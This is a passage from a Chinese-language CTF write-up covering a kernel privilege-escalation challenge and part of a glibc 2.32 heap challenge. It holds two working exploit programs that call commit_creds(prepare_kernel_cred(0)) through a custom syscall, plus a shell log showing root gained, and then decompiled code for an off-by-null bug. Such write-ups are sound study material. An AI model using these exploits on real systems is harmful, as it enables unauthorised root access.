<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d98ce4&gt;<span class="o">]</span> simple_write_begin+0x24/0x190
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1e193&gt;<span class="o">]</span> generic_perform_write+0xb3/0x1a0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834c2fed&gt;<span class="o">]</span> ? down_write+0xd/0x40
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1f4e4&gt;<span class="o">]</span> __generic_file_write_iter+0x104/0x1b0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1f669&gt;<span class="o">]</span> generic_file_write_iter+0xd9/0x200
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3c795&gt;<span class="o">]</span> ? initcall_blacklist+0xaa/0xaa
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d728f0&gt;<span class="o">]</span> __vfs_write+0xb0/0xe0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d73301&gt;<span class="o">]</span> vfs_write+0x91/0x180
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3c795&gt;<span class="o">]</span> ? initcall_blacklist+0xaa/0xaa
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d73f14&gt;<span class="o">]</span> SyS_write+0x44/0xb0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3e11d&gt;<span class="o">]</span> xwrite+0x29/0x5c
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3de5b&gt;<span class="o">]</span> ? md_run_setup+0x94/0x94
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3e706&gt;<span class="o">]</span> do_copy+0x29/0xb6
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3defc&gt;<span class="o">]</span> write_buffer+0x26/0x37
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3e560&gt;<span class="o">]</span> unpack_to_rootfs+0xf2/0x26f
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3e8a0&gt;<span class="o">]</span> ? maybe_link.part.4+0x10d/0x10d
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3e8fc&gt;<span class="o">]</span> populate_rootfs+0x5c/0x108
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82c003b7&gt;<span class="o">]</span> do_one_initcall+0x87/0x1a0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff83b3cfa7&gt;<span class="o">]</span> kernel_init_freeable+0x159/0x1ec
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834bf4d0&gt;<span class="o">]</span> ? rest_init+0x80/0x80
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834bf4d9&gt;<span class="o">]</span> kernel_init+0x9/0xe0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834c4ed5&gt;<span class="o">]</span> ret_from_fork+0x55/0x80
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834bf4d0&gt;<span class="o">]</span> ? rest_init+0x80/0x80
<span class="o">[</span>    0.431104<span class="o">]</span> Rebooting in <span class="m">1</span> seconds..
</code></pre></td></tr></table>
</div>
</div><p>看了一眼发现开完gzip太大了，所以启动脚本还是不能直接打包成cpio就送进去。顺便改了一下题目启动脚本（甚至有错别字） 这是题目给的脚本，paneic=1是什么鬼？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 -m 128M -initrd initramfs.cpio -kernel ./bzImage -nographic -monitor /dev/null -append <span class="s2">&#34;kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet&#34;</span> -s 2&gt;/dev/null
</code></pre></td></tr></table>
</div>
</div><p>改了一下，能跑了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
gcc   exp.c -static -masm<span class="o">=</span>intel  -fno-stack-protector  -o exploit
<span class="c1"># gcc -o exp -static -fno-stack-protector -DREMOTE -nostdlib poc.c</span>
cp exp files/

<span class="nb">cd</span> files
find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.cpio
<span class="nb">cd</span> ..
gzip rootfs.cpio

<span class="nb">read</span> input

<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;y&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
        <span class="nb">echo</span> <span class="s1">&#39;wrong&#39;</span>
        <span class="nb">exit</span>
<span class="k">fi</span>

qemu-system-x86_64 -m 128M -initrd rootfs.cpio.gz <span class="se">\
</span><span class="se"></span>        -no-reboot <span class="se">\
</span><span class="se"></span>        -kernel ./bzImage -nographic -monitor /dev/null <span class="se">\
</span><span class="se"></span>        -append <span class="s2">&#34;kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet&#34;</span> -s
</code></pre></td></tr></table>
</div>
</div><p>开了kaslr，但是并没有开kptr_restrict</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ $ cat /proc/sys/kernel/kptr_restrict
0
/ $ cat /proc/sys/kernel/perf_event_paranoid
1
</code></pre></td></tr></table>
</div>
</div><p>所以每次读出来地址就行，然后调用它的syscall在内核态拿到root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* x1do0 / Lilac */</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define __NR_SUSCALL 546
</span><span class="cp">#define KERNCALL __attribute__((regparm(3)))
</span><span class="cp"></span><span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>


<span class="kt">void</span> <span class="nf">get_root</span><span class="p">(){</span>
        <span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Read commit_creds ... &#34;</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commit_creds</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Okay, commit_creds is : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Read prepare_kernel_cred ... &#34;</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prepare_kernel_cred</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Okay, prepare_kernel_cred is : 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] try to syscall, get root return : %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_SUSCALL</span><span class="p">,</span> <span class="n">get_root</span><span class="p">));</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>成功拿到&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ $ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
/ $ ls /
bin      etc      home     lib64    proc     share    var
boot     exp      init     libexec  root     sys
dev      exploit  lib      linuxrc  sbin     usr
/ $ cat proc/kallsyms <span class="p">|</span> grep commit_creds
ffffffff82c745f0 T commit_creds
/ $ cat proc/kallsyms <span class="p">|</span> grep prepare_kernel
ffffffff82c749c0 T prepare_kernel_cred
/ $ /exploit
<span class="o">[</span>*<span class="o">]</span> Read commit_creds ...
0xffffffff82c745f0
<span class="o">[</span>*<span class="o">]</span> Okay, commit_creds is : 0xffffffff82c745f0<span class="o">[</span>*<span class="o">]</span> Read prepare_kernel_cred ...
0xffffffff82c749c0
<span class="o">[</span>*<span class="o">]</span> Okay, prepare_kernel_cred is : 0xffffffff82c749c0<span class="o">[</span>*<span class="o">]</span> try to syscall, get root <span class="k">return</span> : <span class="m">0</span>
/ <span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
/ <span class="c1">#</span>
</code></pre></td></tr></table>
</div>
</div><p>看了下discord有位老哥贴的exp，思路一样，证明了这题是多么哈批。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define __NR_SUSCALL 546
</span><span class="cp"></span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">leak_t</span><span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">commit_creds</span><span class="p">;</span>
<span class="p">}</span> <span class="n">leaks</span><span class="p">;</span>

<span class="n">leaks</span> <span class="n">leak</span><span class="p">;</span>

<span class="c1">// get leaks
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="nf">get_leaks</span><span class="p">(</span><span class="n">leaks</span> <span class="o">*</span> <span class="n">leak</span><span class="p">){</span>
    <span class="n">FILE</span> <span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/proc/kallsyms&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">lineptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">size_t</span> <span class="n">n</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">counter</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="n">getline</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lineptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">lineptr</span><span class="p">,</span> <span class="s">&#34;prepare_kernel_cred&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
            <span class="n">lineptr</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">sscanf</span><span class="p">(</span><span class="n">lineptr</span><span class="p">,</span> <span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leak</span><span class="o">-&gt;</span><span class="n">prepare_kernel_cred</span><span class="p">);</span>
            <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">lineptr</span><span class="p">,</span> <span class="s">&#34;commit_creds&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
            <span class="n">lineptr</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">sscanf</span><span class="p">(</span><span class="n">lineptr</span><span class="p">,</span> <span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leak</span><span class="o">-&gt;</span><span class="n">commit_creds</span><span class="p">);</span>
            <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_root</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">prepare_kernel_cred</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">commit_creds</span><span class="p">;</span>
    <span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="c1">// gain root
</span><span class="c1"></span>    <span class="n">get_leaks</span><span class="p">(</span><span class="o">&amp;</span><span class="n">leak</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] prepare_kernel_cred: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak</span><span class="p">.</span><span class="n">prepare_kernel_cred</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] commit_creds: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak</span><span class="p">.</span><span class="n">commit_creds</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">root_creds</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_SUSCALL</span><span class="p">,</span> <span class="n">get_root</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="trash">trash</h2>
<p>直接给了堆地址，用于绕过2.32的异或检测。</p>
<p>C++堆，用allocator开的堆，但并没有考常规c++析构函数的double free，而是一个明显的off-by-null。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_26A3</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// bl
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">get_len</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">check_add</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">check_add</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">no_check_add</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v3</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// off-by-null
</span><span class="c1"></span>  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>但这个'\x00&rsquo;也导致了后续利用的困难，因为打印函数会在此截断。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_275A</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">check_add</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">check_add</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>总的来说这题比较麻烦的点在于：</p>
<ol>
<li>所有的读入后面都会添加\x00，同时\n也会读入</li>
<li>没有free，只有类似于realloc改变大小时顺带的free</li>
<li>开了sandbox，只能orw</li>
<li>glibc2.32 在输入堆地址时记得mask一下</li>
</ol>
<p>令人痛心的是，新版本的setcontext已经不用rdi了，导致只能rop</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Dump of assembler code for function setcontext:                         
   0x000015555517b0a0 &lt;+0&gt;:     endbr64                                 
   0x000015555517b0a4 &lt;+4&gt;:     push   rdi                              
   0x000015555517b0a5 &lt;+5&gt;:     lea    rsi,[rdi+0x128]                  
   0x000015555517b0ac &lt;+12&gt;:    xor    edx,edx                          
   0x000015555517b0ae &lt;+14&gt;:    mov    edi,0x2                          
   0x000015555517b0b3 &lt;+19&gt;:    mov    r10d,0x8                         
   0x000015555517b0b9 &lt;+25&gt;:    mov    eax,0xe                          
   0x000015555517b0be &lt;+30&gt;:    syscall                                 
   0x000015555517b0c0 &lt;+32&gt;:    pop    rdx                              
   0x000015555517b0c1 &lt;+33&gt;:    cmp    rax,0xfffffffffffff001           
   0x000015555517b0c7 &lt;+39&gt;:    jae    0x15555517b1ef &lt;setcontext+335&gt;  
   0x000015555517b0cd &lt;+45&gt;:    mov    rcx,QWORD PTR [rdx+0xe0]         
   0x000015555517b0d4 &lt;+52&gt;:    fldenv [rcx]                            
   0x000015555517b0d6 &lt;+54&gt;:    ldmxcsr DWORD PTR [rdx+0x1c0]           
   0x000015555517b0dd &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]         
   0x000015555517b0e4 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]         
   0x000015555517b0eb &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]         
